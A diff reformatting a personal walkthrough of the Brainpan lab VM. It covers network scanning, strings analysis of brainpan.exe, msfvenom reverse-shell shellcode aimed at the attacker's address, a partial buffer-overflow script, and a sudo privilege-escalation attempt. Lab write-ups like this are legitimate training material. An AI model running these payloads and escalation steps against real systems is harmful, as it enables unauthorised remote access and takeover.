@@ -1,14 +1,14 @@
-Reconnaissance:
+####Reconnaissance:
 
 Started by finding the host on the network.
 
-nmap -sS -O 192.168.118.0/24
+`nmap -sS -O 192.168.118.0/24`
 
 192.168.118.185 looks guilty.
 
-Enumeration:
+####Enumeration:
 
-root@kali:~/brainpan# nmap -A -T4 192.168.118.185
+```root@kali:~/brainpan# nmap -A -T4 192.168.118.185`
 
 Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-19 19:22 MDT
 Nmap scan report for 192.168.118.185
@@ -67,11 +67,12 @@ Network Distance: 1 hop
 TRACEROUTE
 HOP RTT     ADDRESS
 1   0.47 ms 192.168.118.185
-
+```
 Oh...a strange box with it's own little game.  Typically, I'm not a big fan, but I'll dig more.
 
-root@kali:~/brainpan# nikto -h http://192.168.118.185:10000
-- Nikto v2.1.6
+`root@kali:~/brainpan# nikto -h http://192.168.118.185:10000`
+
+```- Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          192.168.118.185
 + Target Hostname:    192.168.118.185
@@ -91,9 +92,11 @@ root@kali:~/brainpan# nikto -h http://192.168.118.185:10000
 + End Time:           2017-05-19 19:27:27 (GMT-6) (9 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
-root@kali:~/brainpan# dirb http://192.168.118.185:10000
+```
 
------------------
+`root@kali:~/brainpan# dirb http://192.168.118.185:10000`
+
+```-----------------
 DIRB v2.22    
 By The Dark Raver
 -----------------
@@ -113,14 +116,15 @@ GENERATED WORDS: 4612
 -----------------
 END_TIME: Fri May 19 19:28:02 2017
 DOWNLOADED: 4612 - FOUND: 2
-root@kali:~/brainpan#
+```
 
 Browsing to http://192.168.118.185/bin has an executable, brainpan.exe.
 
 I'll bite, lets see what strings can tell us.
 
-root@kali:~/brainpan# strings brainpan.exe
-!This program cannot be run in DOS mode.
+`root@kali:~/brainpan# strings brainpan.exe`
+
+```!This program cannot be run in DOS mode.
 .text
 `
 [^_]
@@ -151,6 +155,7 @@ done.
 [+] check is %d
 [!] accept failed: %d
 [+] cleaning up.
+```
 
 It looks like shitstorm is the password, but I still get ACCESS DENIED.
 
@@ -160,6 +165,7 @@ https://www.mogozobo.com/?p=2324
 
 msfencode has been replaced, so i changed the command.
 
+```
 root@kali:~/brainpan# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.118.180 LPORT=443 -f python
 No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 No Arch selected, selecting Arch: x86 from the payload
@@ -173,6 +179,7 @@ buf += "\xa8\x76\xb4\x68\x02\x00\x01\xbb\x89\xe1\xb0\x66\x50"
 buf += "\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73"
 buf += "\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0"
 buf += "\x0b\xcd\x80"
+
 
 
 #!/usr/bin/python
@@ -214,9 +221,11 @@ except:
 root@kali:~/brainpan# python fuzz.py
 [-] Connecting to 192.168.118.185
 [-] Sending payload....  Done
+```
 
 I don't get the reverse shell, my shellcode is much smaller.  Back to messing with msfvenom.
 
+```
 root@kali:~/brainpan# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.118.180 LPORT=443 R -e x86/alpha_upper -b "\x00" -f python
 No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 No Arch selected, selecting Arch: x86 from the payload
@@ -243,9 +252,11 @@ buf += "\x31\x38\x4d\x4b\x30\x56\x32\x45\x38\x52\x4e\x46\x4f"
 buf += "\x42\x53\x32\x48\x55\x38\x36\x4f\x46\x4f\x45\x32\x45"
 buf += "\x39\x4b\x39\x4a\x43\x36\x32\x30\x53\x4b\x39\x4b\x51"
 buf += "\x58\x30\x34\x4b\x58\x4d\x4d\x50\x41\x41"
+```
 
 That looks better!  Too bad it still doesn't work.
 
+```
 root@kali:~/brainpan# cat fuzz.py
 #!/usr/bin/python
 # etFuzz.py - Xerubus' malleable fuzzer
@@ -293,9 +304,11 @@ except:
       print "[-] Unable to connect to " + str(victim)
       sys.exit(0)
 root@kali:~/brainpan#
+```
 
 LOOK!  I fixed my python script...it works now.
 
+```
 uname -r
 3.5.0-25-generic
 cat /proc/version
@@ -303,9 +316,10 @@ Linux version 3.5.0-25-generic (buildd@lamiak) (gcc version 4.7.2 (Ubuntu/Linaro
 
 sudo su
 sudo: no tty present and no askpass program specified
-
+```
 It has worked before :)
 
+```
 sudo -l
 Matching Defaults entries for puck on this host:
     env_reset, mail_badpass,
@@ -313,14 +327,15 @@ Matching Defaults entries for puck on this host:
 
 User puck may run the following commands on this host:
     (root) NOPASSWD: /home/anansi/bin/anansi_util
-
+```
 
 What is this anansi_util?  I'm going to start by making my shell interactive.
 
-python -c 'import pty;pty.spawn("/bin/sh")'
+`python -c 'import pty;pty.spawn("/bin/sh")'`
 
 Fighting with sudo....no, your a no tty present and no askpass program specified!
 
+```
 echo '' | sudo -S /home/anansi/bin/anansi_util
 Where [action] is one of:
   - network
@@ -328,5 +343,6 @@ Where [action] is one of:
   - manual [command]
 
 sudo -S /home/anansi/bin/anansi_util manual /bin/sh
+```
 
-Hmm, I was expecting that to work.  From looking back at the walkthough they did the same thing.  Same results after rebooting the VM.  Well, at lest i learned a bunch about msfvenom and strcpy buffer overflows.
+Hmm, I was expecting that to work.  From looking back at the walkthough they did the same thing.  Same results after rebooting the VM.  Well, at lest I learned a bunch about msfvenom and strcpy buffer overflows.  :)
